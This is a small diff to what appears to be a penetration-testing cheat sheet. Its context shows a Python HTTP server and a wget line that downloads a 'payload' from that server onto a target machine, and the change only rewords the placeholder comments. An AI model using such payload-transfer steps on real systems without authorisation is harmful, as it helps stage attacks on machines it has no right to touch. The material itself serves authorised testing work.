@@ -277,8 +277,8 @@ sudo python3 -m http.server {PORT}
 # Usage - Download on server machine
 wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
-# {IP ADDRESS}: Python Server IP Address from step one
-# {FILE}:       The payload to be trasnfered
+# {IP ADDRESS}: IP Address of the client from step one (python server)
+# {FILE}:       The payload to be transferred
 ```
 <br />
 
